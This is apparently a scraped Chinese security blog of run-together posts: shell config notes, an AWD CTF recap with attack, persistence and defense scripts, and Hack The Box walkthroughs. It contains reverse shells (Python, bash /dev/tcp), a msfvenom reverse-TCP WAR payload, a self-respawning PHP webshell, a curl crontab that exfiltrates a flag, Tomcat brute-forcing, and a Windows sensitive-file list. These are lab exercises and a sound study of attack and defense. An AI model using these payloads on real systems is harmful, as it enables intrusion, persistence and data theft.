themeZSH_THEME=&quot;ys&quot;# aliasalias ctf=&quot;cd /mnt/hgfs/ctf&quot;alias tools=&quot;cd /mnt/hgfs/tools&quot;alias clash=&quot;~/clash/clash -d ~/clash/&quot;alias htbvpn=&quot;openvpn ~/cjM00N.ovpn&quot;alias pc=&quot;proxychains&quot;alias tmuxa=&quot;tmux a -t&quot;alias tmuxn=&quot;tmux new -s&quot;alias vi=&quot;vim&quot;alias burp=&quot;/opt/Burpsuite/start.sh&quot; 内外网切换12345netstat -nr 查看路由表sudo route delete 0.0.0.0 删除默认路由sudo route add -net 0.0.0.0 192.168.1.1 默认使用192.168.1.1网关sudo route add 10.200.0.0 10.200.22.254 有线网卡使用该网关sudo route add 10.0.1.0/24 10.200.22.254 其它网段指定网关 切换java版本1update-alternatives --config java tmux配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# reload with Ctrl+rbind C-r source-file ~/.tmux.conf \\; display &quot;Reloaded!&quot;# tmux attachnew-session# vi keymapset-option -g status-keys viset-window-option -g mode-keys vi# vi-type selection and copybind -T copy-mode-vi v send-keys -X begin-selectionbind -T copy-mode-vi y send-keys -X copy-selection-and-cancel# choose pane with vi-keybind -r ^k selectp -Ubind -r ^j selectp -Dbind -r ^h selectp -Lbind -r ^l selectp -R# exec command manbind m command-prompt &quot;splitw -h &apos;exec man %%&apos;&quot;# add Ctrl+a to prefix key set -g prefix2 C-abind C-a send-prefix -2# new pane - = # horizontalunbind &apos;&quot;&apos;bind - splitw -v -c &apos;#&#123;pane_current_path&#125;&apos; # verticalunbind %bind = splitw -h -c &apos;#&#123;pane_current_path&#125;&apos; # colorset -g default-terminal &quot;screen-256color&quot;# renamesetw -g automatic-rename offsetw -g allow-rename off# mouse set -g mouse on# ------ status theme -------------------------------set -g message-style &quot;bg=#00346e, fg=#ffffd7&quot; # tomorrow night blue, base3set -g status-style &quot;bg=#00346e, fg=#ffffd7&quot; # tomorrow night blue, base3set -g status-left &quot;#[bg=#0087ff] &gt; #S &quot; # blueset -g status-left-length 400set -g status-right &quot;#[bg=#0087ff] #(whoami)@#h #[bg=red] %Y-%m-%d %H:%M &quot;set -g status-right-length 600set -g set-clipboard onset -g history-limit 8000set -wg window-status-format &quot; #I #W &quot;set -wg window-status-current-format &quot; #I #W &quot;set -wg window-status-separator &quot;&quot;set -wg window-status-current-style &quot;bg=red&quot; # redset -wg window-status-last-style &quot;fg=#dddddd&quot;set -wg pane-active-border-style &quot;fg=blue&quot;set -wg pane-border-style &quot;fg=#585858&quot; # base01set -g status-justify left powershell 设置别名打开配置文件 1code $PROFILE 设置别名样例如下 1234function cdTools&#123; Set-Location D:\\tools&#125;Set-Alias tools cdTools 重启powershell即可","link":"/2019/10/24/Config文档/"},{"title":"Xman结营赛AWD总结","text":"Xman20天结束了, 感谢各路大佬抬我一手, 第二次打AWD, 虽然还是很菜, 但总不至于毫无输出了, 膜一波@q4n和@Cosmos, 由于总结的时候已经过去两天了, 当时的图都没留下来, 很多地方大家就意会一下吧我还是觉得这个赛制很神奇, 竟然有可以打自己出的题的比赛 准备还是太浪了, 结营赛前一天才开始准备, 本来想上@王一航师傅的框架 AWD Framework , 但是准备的比较晚没搞懂, 就还是上网找了散装脚本用了, 后面会把用到的脚本罗列一下 比赛前一晚还搭好了hackmd, 但是没有整明白虚拟机的网络配置..只能我自己连上去, 导致比赛的过程交流都是物理交流了hhhh 文件交流1234# python2python -m SimpleHTTPServer 8000# python3python -m http.server 8000 文档交流推荐使用codimd 搭建方法参考 https://hackmd.io/c/codimd-documentation/%2Fs%2Fcodimd-docker-deployment 装好了docker和docker-compose只需要三行命令 123git clone https://github.com/hackmdio/docker-hackmd.gitcd docker-hackmddocker-compose up 然后访问localhost:3000即可 图片上传的部分需要进去docker里面修改一下, 默认是imgur图床 1234567# 进入容器, 需要对应containeriddocker exec -it containerid /bin/bash# 安装vimapt update &amp;&amp; apt install vim# 修改vim config.json#修改imageuploadtype为filesystem 然后就可以正常传图片了 虚拟机的网络设置需要改成桥接模式, 这样才能和主机在同一个段, 局域网内可以正常访问 比赛登录比赛开始的时候发了账号密码, 登录上去一直看不到赛题信息, 还以为是网络问题, 后面问了才发现是广告插件的问题 , 关闭广告插件就可以看到了 关闭广告拦截插件 然后下载赛题信息, 里面有ip和ssh的公私钥 第一次连, 差点不会连, 还好MobaXTerm的界面设计的不错, 一眼就看到了在哪里添加 输入host和username(这里是xman) 勾选 Use private Key 选择不带后缀的私钥 id_rsa 然后就可以登录上去了 弱密码这里主要涉及的是 ssh密码 mysql密码 phpmyadmin密码 etc 不过这部分暂时还没找到相关的脚本, 师傅们有的话可以来交流一下 ssh先登录上去, 之后 1passwd 输入密码即可, 改完自己的直接开始打 这里可以用@p0desta师傅的框架 awd-attack 不过没有集成修改ssh密码的功能, 后面再自己改一下吧 数据库12mysql&gt;set password=password(&apos;new&apos;);mysql&gt;flush privileges; 没改的话上去就可以删库跑路了hhh 备份备份还是大意了, 比赛前想过备份数据库, 连命令都准备好了, 结果上去就忘记了, 导致web9从开始就宕机宕到结束 (自己背锅 下面的备份都是备份到家目录 源码备份这里有个注意的点是, 如果不先进入html文件夹的话, 备份后的压缩包会包含整个路径 12# 不建议tar -zcvf ~/html.tar.gz /var/www/html/ 下面的命令压缩后结构如下 12cd /var/www/htmltar -zcvf ~/html.tar.gz * 如果需要恢复则可以使用下面的命令 12rm -rf /var/www/htmltar -zxvf ~/html.tar.gz -C /var/www/html 或者 123cd /var/www/htmlrm -rf *tar -zxvf ~/html.tar.gz 数据库备份先在html文件夹里面搜索一下数据库的用户名和密码 12cd /var/www/htmlfind .|xargs grep &quot;password&quot; , 然后开始备份 12345678#mysql终端下可以先看一下有什么数据库mysql&gt;show databases;# 备份相应的数据库mysqldump -u 用户名 -p 数据库名&gt;~/back.sql# 备份全部数据库mysqldump -u root -p --all-databases &gt;~/back.sql# 跳过锁定的数据库表mysqldump -u root -p --all-databases —skip-lock-tables &gt;~/back.sql 恢复的话, 需要先建好相应的数据库 1234cd mysql&gt;create database xxx;mysql&gt;use xxx;mysql&gt;source back.sql; 或者在终端下 12cdmysql -u root -p xxx&lt;back.sql 上wafwaf, 也就是通用防御, 可以用的一般有下面两种 流量监控, 必上 文件监控, 看情况 至于其他的骚套路, 像流量转发, iptables等等这些有一定的风险, 可能会被举报, 不建议 流量监控重要, 必须上, 流量相当于我们的眼睛, 没有流量只能被动挨打, 有了流量才可以抄作业hhhh 这里贴一下@郁离歌师傅的waf 不过这次结营赛官方提供了pcap流量包, 后面会提到 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;?phperror_reporting(0); define(‘LOG_FILEDIR’,’/tmp’); function waf() &#123; if (!function_exists(‘getallheaders’)) &#123; function getallheaders() &#123; foreach ($_SERVER as $name =&gt; $value) &#123; if (substr($name, 0, 5) == ‘HTTP_’) $headers[str_replace(‘ ‘, ‘-‘, ucwords(strtolower(str_replace(‘_’, ‘ ‘, substr($name, 5)))))] = $value; &#125; return $headers; &#125; &#125; $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER[“REMOTE_ADDR”]; $method = $_SERVER[‘REQUEST_METHOD’]; $filepath = $_SERVER[“SCRIPT_NAME”]; foreach ($_FILES as $key =&gt; $value) &#123; $files[$key][‘content’] = file_get_contents($_FILES[$key][‘tmp_name’]); file_put_contents($_FILES[$key][‘tmp_name’], “virink”); &#125;unset($header[‘Accept’]);$input = array(“Get”=&gt;$get, “Post”=&gt;$post, “Cookie”=&gt;$cookie, “File”=&gt;$files, “Header”=&gt;$header);logging($input);&#125;function logging($var)&#123; $filename = $_SERVER[‘REMOTE_ADDR’];$LOG_FILENAME = LOG_FILEDIR.”/”.$filename;$time = date(“Y-m-d G:i:s”);file_put_contents($LOG_FILENAME, “\\r\\n”.$time.”\\r\\n”.print_r($var, true), FILE_APPEND); file_put_contents($LOG_FILENAME,”\\r\\n”.’http://’.$_SERVER[‘HTTP_HOST’].$_SERVER[‘PHP_SELF’].’?’.$_SERVER[‘QUERY_STRING’], FILE_APPEND);file_put_contents($LOG_FILENAME,”\\r\\n***************************************************************”,FILE_APPEND);&#125;waf(); ?&gt; 自动上waf的脚本, 这个脚本需要注意的是, waf的路径必须是绝对路径, 因为是递归添加waf, 如果不是绝对路径, 内层文件夹的php文件无法找到waf的路径, 服务就会宕掉, 但是如果全部上的话, 就算上对了还是有可能出现宕机, 这个与namespace有关, 可以了解一下, 如果是常见的cms可以上在入口的php中, 就能监听到流量了 1234567891011121314151617181920212223242526272829#-*- coding:utf-8 -*'''批量添加WAF的python脚本'''import osbase_dir = '/var/www/html' #web pathdef scandir(startdir) : os.chdir(startdir) for obj in os.listdir(os.curdir) : path = os.getcwd() + os.sep + obj if os.path.isfile(path) and '.php' in obj and 'log' not in path: modifyip(path,'&lt;?php','&lt;?php\\nrequire_once(\\'/var/www/html/log.php\\');') if os.path.isdir(obj) : scandir(obj) os.chdir(os.pardir) def modifyip(tfile,sstr,rstr): try: lines=open(tfile,'r').readlines() flen=len(lines)-1 for i in range(flen): if sstr in lines[i]: lines[i]=lines[i].replace(sstr,rstr) open(tfile,'w').writelines(lines) except Exception,e: print e scandir(base_dir) 文件监控这个的话要看情况, 如果check会检查是否能正常上传文件的话, 这个一上就宕机, 但是有时候check没有检查的话, 就可以上一下, 避免被写马 主要使用的时候修改里面的Special_string字段 然后在自己修改文件的时候只需要在里面加入这个字段即可, 例如 1234vi index.php....# cjM00N... 这样就可以绕过文件监控了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174# -*- coding: utf-8 -*-#use: python file_check.py ./ import osimport hashlibimport shutilimport ntpathimport time CWD = os.getcwd()FILE_MD5_DICT = &#123;&#125; # 文件MD5字典ORIGIN_FILE_LIST = [] # 特殊文件路径字符串Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN' Special_string = 'cjM00N' # 免死金牌UNICODE_ENCODING = \"utf-8\"INVALID_UNICODE_CHAR_FORMAT = r\"\\?%02x\" # 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123; 'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)), 'log' : os.path.realpath(os.path.join(spec_base_path, logstring)), 'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)), 'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125; def isListLike(value): return isinstance(value, (list, tuple, set)) # 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + \"\".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=\"ignore\") # 目录创建def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise # 获取当前所有文件路径def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist # 计算机文件MD5值def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : ' + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass # 获取所有文件MD5def getfilemd5dict(filelist = []): filemd5dict = &#123;&#125; for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict # 备份所有文件def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path['bak']) if __name__ == '__main__': print u'---------start------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] webshell find : ' + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) pass time.sleep(2) # print '[*] ' + getUnicode(time.ctime()) 扫后门题目备份后拉下来用D盾扫一下后门, 一般来说awd都会预留一个后门, 让比赛快速推进 直接把文件夹丢进去就可以了 很明显就能看到有后门, 先删自己的, 再看看能不能利用打一波 流量分析wireshark这次比赛提供了pcap流量包, 不会用wireshark看的头疼, 比赛都是直接记事本打开看….后面去学习了一下 首先分析一下这次的网络拓扑 假设队伍id为1, 则队伍的选手在 110.10.1.1-10 题目则在 110.10.1.21-30 其他队伍类似, 只是id不同 首先打开wireshark,如图, 下面介绍几种过滤, 不同过滤之间使用and连接 协议可以看到protocol协议有http和tcp两种, tcp都是握手包, 我们可以先筛选出http包, 过滤器中输入 1http 长度一般来说长度较长的可能是关键的流量, 点击length按长度排序 当然这里就是另外一种情况了, 长的全都是垃圾流量hhhh http方式可以过滤 get和post两种, 优先可以考虑post 1http.request.method==&quot;POST&quot; ip如果觉得某个ip一直访问或者每隔一段时间就访问一次, 这种很有可能就是exp访问, 这就需要过滤ip来看一下他的流量了 1ip.src == 10.10.1.14 其他的ip过滤如下 1234# 源ip和目的ipip.addr == 10.10.1.14# 目的ipip.dst == 10.10.1.14 端口用的不多, 命令如下 123456# 源端口和目的端口tcp.port == 80# 源端口tcp.srcport == 80# 目的端口tcp.dstport == 80 mac也比较少用 1eth.addr == 20:dc:e6:f3:78:cc 追踪数据流如果怀疑某个包有问题, 可以右键追踪数据流 直接搜索字段在分组字节流搜索字符串, 说不定有奇效(图中就是有效流量 log记录如果不会看wireshark(比如我)或者是不提供流量包的比赛, 就需要自己上waf去监控了, 抓取的流量如下 后面就是分析流量了, 有个需要注意的点是, 建议在抓取流量的时候, 按时间分流量包, 比如10分钟一个文件, 这样流量不会太大, 加载起来也快, 读起来也方便 如果遇到垃圾流量多的时候一个文件就很难顶了 快速攻击快速攻击主要利用的是burpsuite和它的一个插件 这个插件可以快速的把burp抓到的包转换成代码, 一般为python, 使用的是request库 使用如下, 在包内右键, 然后选择 1Generate Script 就会出现转换的代码了, 直接复制后改一下就可以打了 对于扫出来的后门或者流量分析出来的payload都可以这样用burp快速复现并直接生成代码去打 全场攻击以其中一个脚本为例, 首先使用上面提到的插件生成代码后粘贴进来, 然后根据题目分布, 写个for循环打一遍, 再利用while True让程序死循环跑, 如果某个ip已经不可以打的话就将其加到ban列表里面, 然后每轮输出一共打了几个, 再sleep(300), 也就是5分钟, 比赛是一轮10分钟, 一轮打两次避免特殊情况(如打的时候突然宕机等等) 1234567891011121314151617181920212223242526272829import requestsfrom time import sleepsession = requests.Session()ban = []while True: num = 0 for i in range(11): if i in ban: continue url = \"http://10.10.%d.30/index.php\" % i #print url paramsGet = &#123;\"a\":\"show_pic\",\"c\":\"index\",\"file\":\"/flag\"&#125; headers = &#123;\"Cache-Control\":\"no-cache\",\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36\",\"Connection\":\"close\",\"Pragma\":\"no-cache\",\"Accept-Encoding\":\"gzip, deflate\",\"Accept-Language\":\"zh,zh-CN;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6\"&#125; try: response = session.get(url, params=paramsGet, headers=headers, timeout=1).content.strip() if len(response) &gt; 20: r2 = requests.post('http://10.66.66.66/api/v1/ad/web/submit_flag/?event_id=1',data=&#123;\"flag\": response,\"token\":\"dzVaFmggB2WXHDjwMGug8uXi7TTRBEBNxZxHGCngJskgm\"&#125;) print r2.text if \"success\" in r2.text: num += 1 #print(response) else: if i not in ban: ban.append(i) sleep(1) except: pass print num sleep(300) 不过这个写的还是比较糙的, 没有什么参考价值, 大家看一看就好 不死马与杀马一般不死马大概长这样 1234567891011121314&lt;?php set_time_limit(0); ignore_user_abort(true); $file = '.conifg.php'; $shell = \"&lt;?php echo system(\"curl 10.0.0.2\"); ?&gt;\"; while(true)&#123; file_put_contents($file, $shell); system('chmod 777 .demo.php'); usleep(50); &#125;?&gt; 里面有几个点, 首先是文件名, 在linux下面有两种文件名开头比较特别 .开头, 这种文件在linux下为隐藏文件, 直接ls看不到, 需要用ls -all 或者ll才能看到 -开头, 会被linux命令识别为参数, 删除会出错 这里可以使用命令如下 1234rm ./-config.phprm -- -config.php# 如果只有一个文件rm -rf * 然后就是马的主体部分, 死循环不断生成文件, 单纯删掉文件没有用, 还是会生成, 而且此时php文件已经写到内存里面了, 我们可以这么杀马 12345rm .config.php &amp;&amp; mkdir .config.phpkillall -9 apache2# 或者killall -9 -u www-datarm -rf .config.php 通过新建文件夹让程序无法继续写马, 然后再杀掉进程, 删了文件夹就可以了 这只是最基础的内存马, 还有各种花哨的马, 比如几个马相互守护, 定时任务马等等, 删除的方法都差不多, 无非都是想办法杀进程建文件夹来让马失效, 还听说过区块链马, 可以让中马的机器变成一群肉机, 利用他们来进行攻击等等. 定时任务定时任务的语法可以参考https://www.runoob.com/linux/linux-comm-crontab.html 大体就是前面分别表示 分 时 日 月 年 , /后表示每多久执行一次,例如下面的命令就是每十分钟执行一次 1*/10 * * * * command 123456# listcrontab -l# 删除crontab -r# submit flagecho &quot;*/10 * * * * curl ip:port/submit_flag/ -d &apos;flag=&apos;$(/bin/cat /flag)&apos;&amp;token=xxxx&apos;&quot; |crontab 比赛中可以用来写crontab定时getflag, 删除则是crontab -r, 如果是循环写入的, 就得写个循环删, 或者先杀马再删, 一般来说都是结合不死马一起打的组合拳 总结这次比赛准备还是不足, 罗列一下大概如下 没有使用框架, 只是简单的cat /flag , 不能持续输出, 如果别人补了洞就打不了 没有准备好垃圾流量脚本, payload赤裸裸的打出去, 别人抄作业也抄的快, 打了几轮得分就慢慢变少了 备份不够熟练, 原来的备份命令写的有点问题, 导致备份有点慢, 也忘记备份数据库了, 有一道题全程宕机 check写的不好, 只是简单的检查了一下页面, 没有检查页面的内容和数据库的状态, 对选择的cms不熟, 有个洞的exp一直打不出去 总体来说也还好, 队友@Cosmos把自己出的题打了3k分, 权限维持做的不错, 基本从早打到晚, 不过中间好像脚本出了问题, 有一段时间flag打了没交上去, 导致中间没得分, 还是比较亏的, 我抄了几波作业也打的挺快乐 @q4n师傅一个人运维6道pwn题还打了不少输出, 必须膜一波 Xman结束, 接下来就是回归Kap0k了, 希望大三这一年, 能像@C0mRaDe大哥一样做一个真正的web手 最后, 感谢Tea deliverer的@王郁师傅做的AWD分享, 收获很大, 衷心感谢. 参考链接edward- ctf线下赛经验总结 zeroyu-ctf awd模式攻防note 1cePeak-CTF-线下AWD-py脚本 LiN3ver5ec-聊聊AWD攻防赛流程及准备经验","link":"/2019/08/22/Xman结营赛AWD总结/"},{"title":"HTB-Hack之旅","text":"我tcl MachinesBashed难度是ctf中的白给题 打开界面如下 点击phpbash后会跳转到github, 可以看到源码如下 123456if (ISSET($_POST['cmd'])) &#123; $output = preg_split('/[\\n]/', shell_exec($_POST['cmd'].\" 2&gt;&amp;1\")); foreach ($output as $line) &#123; echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . \"&lt;br&gt;\"; &#125; die(); 可以看到直接将命令传入shell, 不过有个2&gt;&amp;1, 会使得一些shell命令不执行 这里是根据wp一步一步做的, 首先看一下nmap 1nmap -sC -sV -oA nmap/init 10.10.10.68 nmap的命令可以参考 https://github.com/erasin/notes/blob/master/linux/safe/nmap.md -sC: 等价于 –script=default, 使用默认类别的脚本进行扫描 -sV: 指定让Nmap进行版本侦测 -oA: 输出至所有格式 可以看到结果如下 然后探测一下目录 1gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 结果如下 访问一下分别得到 123/dev/phpbash.php/php/sendmail.php/uploads/ (NULL) 然后可以通过phpbash来直接执行命令, 首先传一个LinEnum.sh查看一下系统的敏感信息 123456# localpython -m SimpleHTTPServer 8000# remotecd uploadswget http://ip:8000/LinEnum.sh bash LinEnum.sh 结果如下 12345678910[00;31m[-] Super user account(s):[00mroot[00;33m[+] We can sudo without supplying a password![00mMatching Defaults entries for www-data on bashed: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser www-data may run the following commands on bashed: (scriptmanager : scriptmanager) NOPASSWD: ALL 看到有个无密码的账号scriptmanager 那我们再反弹个shell, 可以使用系统自带的php文件 1/usr/share/webshells/php/php-reverse-shell.php 修改ip和端口后, 在uploads写入 1wget http://ip:8000/php-reverse-shell.php 然后访问就可以拿到shell了 再利用附录的升级方法即可获得交互shell, 然后登录进scriptmanager 1su -u scriptmanager bash 可以在/下看到有个scripts文件夹, 访问之, 下面有个root权限的文件 如果可以看到test.py的原内容的话, 他其实是修改了test.txt, 这就说明test.py的执行其实是由root执行的, 但是我们可以写, 那就将内容改为反弹shell 1234567import socket,subprocess,os,ptys=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"ip\",port))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)pty.spawn(\"/bin/bash\") 然后本地监听即可 1nc -lvvp 2334 成功获取root权限 Lame首先进行全面的扫描 1nmap –T4 –A –v targethost -T4: T表示速度(0-5), 值越大则越快 -v: 显示冗余信息 -A: 进攻性的扫描 扫描结果如下, 可以看到有21和139和445应该是可以打的 尝试了一下21端口的vsftpd 2.3.3还真的没打通—, wp诚不欺我 1explort/unix/ftp/vsftpd_234_backdoor 老老实实跟着wp打 1234search CVE-2007-2447use exploit/multi/samba/usermap_script set RHOSTS 10.10.10.3run 然后就是root了 Legacy跟前一题很像, 还是nmap开局 1nmap -T2 -A -v -oA nmap/init 10.10.10.3 xp的机器, 开了smb, 这里可以用MS-08-067来打 理想是丰满的, 这一步我卡了很久很久(国内网络太差了) Jerry1nmap -sC -sV -oA nmap/init 10.10.10.95 8080开放, 访问它, gogo 可以看到是默认的tomcat页面, 有三个选项 server status: admin:admin可以直接访问, 但是没啥用, 查看另外两个, admin无法登陆, 使用hydra爆破 这里其实账号和密码都是明文的, 但是一般还是不会直接给出的, 所以这里还是按照wp的步骤爆破 12apt install seclistshydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html admin:admin不成功, 但是不知道为啥hydra给出来了, 我们这里使用tomcat:s3cret登录 登录进来后有了部署权, 可以传jsp马来getshell 首先使用msfvenom创建一个反弹shell的war马 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.10 LPORT=2334 -f war -o jerry.war 然后查看一下包里面的jsp文件地址 12mkdir tmpcd tmp &amp;&amp; unzip ../jerry.war 再部署到tomcat上面, 本地msf监听一下 123456msfdb runuse exploit/multi/handlerset payload windows/x64/meterpreter/reverse_tcpset LHOST tun0set LPORT 2334run # run -j 后台启动 访问tomcat上面的地址, 就可以在本地接到shell了, 下面是flag ippsec的视频做的真的好, 强烈建议看一看 Netmon1nmap -sC -sV -oA nmap/init 10.10.10.152 可以看到有ftp服务, 连上去康康 123ftp 10.10.10.152# user: Anonymous# pwd: Anonymous 登录之后可以拿到用户的flag 继续进行信息搜集, 我们可以根据下面的字典进行探测 https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768C:/Users/Administrator/NTUser.datC:/Documents and Settings/Administrator/NTUser.datC:/apache/logs/access.logC:/apache/logs/error.logC:/apache/php/php.iniC:/boot.iniC:/inetpub/wwwroot/global.asaC:/MySQL/data/hostname.errC:/MySQL/data/mysql.errC:/MySQL/data/mysql.logC:/MySQL/my.cnfC:/MySQL/my.iniC:/php4/php.iniC:/php5/php.iniC:/php/php.iniC:/Program Files/Apache Group/Apache2/conf/httpd.confC:/Program Files/Apache Group/Apache/conf/httpd.confC:/Program Files/Apache Group/Apache/logs/access.logC:/Program Files/Apache Group/Apache/logs/error.logC:/Program Files/FileZilla Server/FileZilla Server.xmlC:/Program Files/MySQL/data/hostname.errC:/Program Files/MySQL/data/mysql-bin.logC:/Program Files/MySQL/data/mysql.errC:/Program Files/MySQL/data/mysql.logC:/Program Files/MySQL/my.iniC:/Program Files/MySQL/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/data/hostname.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.logC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.errC:/Program Files/MySQL/MySQL Server 5.0/data/mysql.logC:/Program Files/MySQL/MySQL Server 5.0/my.cnfC:/Program Files/MySQL/MySQL Server 5.0/my.iniC:/Program Files (x86)/Apache Group/Apache2/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/httpd.confC:/Program Files (x86)/Apache Group/Apache/conf/access.logC:/Program Files (x86)/Apache Group/Apache/conf/error.logC:/Program Files (x86)/FileZilla Server/FileZilla Server.xmlC:/Program Files (x86)/xampp/apache/conf/httpd.confC:/WINDOWS/php.iniC:/WINDOWS/Repair/SAMC:/Windows/repair/systemC:/Windows/repair/softwareC:/Windows/repair/securityC:/WINDOWS/System32/drivers/etc/hostsC:/Windows/win.iniC:/WINNT/php.iniC:/WINNT/win.iniC:/xampp/apache/bin/php.iniC:/xampp/apache/logs/access.logC:/xampp/apache/logs/error.logC:/Windows/Panther/Unattend/Unattended.xmlC:/Windows/Panther/Unattended.xmlC:/Windows/debug/NetSetup.logC:/Windows/system32/config/AppEvent.EvtC:/Windows/system32/config/SecEvent.EvtC:/Windows/system32/config/default.savC:/Windows/system32/config/security.savC:/Windows/system32/config/software.savC:/Windows/system32/config/system.savC:/Windows/system32/config/regback/defaultC:/Windows/system32/config/regback/samC:/Windows/system32/config/regback/securityC:/Windows/system32/config/regback/systemC:/Windows/system32/config/regback/softwareC:/Program Files/MySQL/MySQL Server 5.1/my.iniC:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xmlC:/Windows/System32/inetsrv/config/applicationHost.configC:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log 接下来需要获取root权限, 先离开ftp看看其他的端口, 个人信息1234# ip10.10.14.10# bashbash -i &gt;&amp; /dev/tcp/10.10.14.10/2333 0&gt;&amp;1 交互式shell半交互式12# python ptypython -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos; 此时可以实现简单的交互, 处于半交互状态, 但是不能用vim这种命令 交互式首先将shell放到后台 1ctrl + z 然后执行 1stty raw -echo 接着使用fg将shell返回前台 1fg 现在的shell看起来会比较奇怪, 使用reset 1reset 再导入如下配置即可 123export SHELL=bashexport TERM=xterm256-colorstty rows 24 columns 80 吐槽一下为啥进入交互式后shell特别卡—- 参考资料 https://bbs.ichunqiu.com/thread-54982-1-1.html","link":"/2019/11/24/HTB-Hack之旅/"},{"title":"icq新春公益赛wp","text":"有一两道挺有意思的 简单的招聘系统很坑, 一开始下发的环境不对, 日了半天 万能密码绕过+union注入 